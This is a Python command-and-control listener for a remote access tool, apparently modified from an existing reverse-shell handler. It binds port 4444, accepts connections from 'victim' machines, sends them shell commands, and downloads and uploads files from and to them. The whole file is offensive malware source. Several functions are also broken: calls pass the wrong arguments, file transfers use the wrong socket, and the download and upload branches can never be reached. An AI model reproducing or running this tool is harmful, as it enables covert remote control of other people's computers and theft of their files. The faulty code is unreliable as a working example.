import socket
import sys
import os ,time

all_connections = []
all_address = []

# socket to allow 2 computers to connect
def create_socket():
     try:
               global host
               global port
               global s
               host = ''
               port = 4444 # don't use common ports like 80, 3389
               s = socket.socket() # actual conversation between server and client
     except socket.error as msg:
           print("Error creating socket: " + str(msg))
           exit(1)

# binds socket to port and wait for connection from client/target
def socket_bind():
     try:
          global host
          global port
          global s
          print("\033[31;1;31m  Binding socket to port: " + str(port))
          print("\033[31;1;37m   ")
          s.bind((host, port)) # host: usually an IP address, but since we listening to our own machine, it is blank
          s.listen(5) # listen allows server to accept connections, number 5 is number of bad connections it will take before refusing
     except socket.error as msg:
          print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
          socket_bind() # recursion, keeps trying if error happens

# establish connection with client (socket must be listening for connections)
def socket_accept():
     for c in all_connections:
         c.close()
     del all_connections[:]
     del all_address[:]
     while True:
            try:
                conn, address = s.accept()
                s.setblocking(1)  # prevents timeout
    
                all_connections.append(conn)
                all_address.append(address)
    
                print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    
                print(" ")
                print("[*] type 'help' to show help message\n")
                send_commands(conn)
            except:
                print("Error accepting connections")
                break

def help():
   print("""
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
help                Show this help message
show target         Show the targets
select              Selecting the target
quit                Kill the connection with client machine
""")

def download(file):
  cmd = file
  file = "".join(file.split("download")).strip()
  if file.strip():
   filetodown = file.split("/")[-1] if "/" in file else file.split("\\")[-1] if "\\" in file else file
   s.send(cmd.encode("UTF-8"))
   down = s.recv().decode("UTF-8",'ignore')
   if down == "true":
     print("[~] Downloading [ {} ]...".format(filetodown))
     wf = open(filetodown, "wb")
     while True:
      data = s.recv()
      if data == ":DONE:": break
      elif data == ":Aborted:":
        wf.close()
        os.remove(filetodown)
        print("[!] Downloading Has Aborted By Client!")
        return
      wf.write(data)
     wf.close()
     print("[*] Download Complete :)\n[*] file Saved In : {}\n".format(os.getcwd()+os.sep+filetodown))
   else:
       print(down)
  else:
      print("Usage: download <file_to_download_from_client_machine>\n")
def upload(cmd):
    filetoup = "".join(cmd.split("upload")).strip()
    if not filetoup.strip():
        print("usage: upload <file_to_upload>\n")
    else:
       if not os.path.isfile(filetoup):
           print("error: open: no such file: "+filetoup+"\n")
       else:
          s.send(cmd.encode("UTF-8"))
          print("[~] Uploading [ {} ]...".format(filetoup))
          with open(filetoup,"rb") as wf:
            for data in iter(lambda: wf.read(4100)):
              try:s.send(data)
              except(KeyboardInterrupt,EOFError):
                wf.close()
                s.send(":Aborted:")
                print("[!] Uploading Has Been Aborted By User!\n")
                return
          s.send(":DONE:")
          savedpath = s.recv().decode("UTF-8")
          print("[*] Upload Complete :)\n[*] File uploaded in : "+str(savedpath).strip()+" in client machine\n")

# sends commands to target/client computer to remote-control it
def send_commands(conn):
     while True: # infinite loop for connection to stay constant
          cmd = input('session ~# ') # cmd = command we type into terminal to send to client
          
          # whatever we type into command line and when running/storing commands is of byte type
          # whenever we want to send across network, need to be of byte type
          # to print out for user, need to be changed to string
          if cmd == 'help':
              help()
              send_commands(conn)
          elif cmd == 'show target':
              list_connections()
              send_commands(conn)
          elif 'select' in cmd:
               conn = get_target(cmd)
               if conn is not None:
                    send_target_commands(conn)
                    send_commands(conn)
          elif 'quit' in cmd:
               print("[!] Connection has been killed!")
               exit(1)
          else:
                print("Command not recognized")

# Display all current active connections with client
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None

def helper():
   print("""
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
helper       Show this help message
download     Download file from client machine
upload       Upload file to client machine
back         Return to the main menu
""")

# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'helper':
                helper(cmd)
                send_target_commands(conn)
            elif 'back' in cmd:
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            elif 'download' in cmd:
                download()
                send_target_commands(conn)
            elif 'upload' in cmd:
                upload()
                send_target_commands(conn)
        except:
            print("Error sending commands")
            send_target_commands(conn)
                       
def main():
     x="MODIFIED BY ZOAL KTOOM \n"
     os.system("clear || cls")
     print ( x, end="\n")
      
     create_socket()
     socket_bind()
     socket_accept() # no need send_commands as this function calls that when called

main()

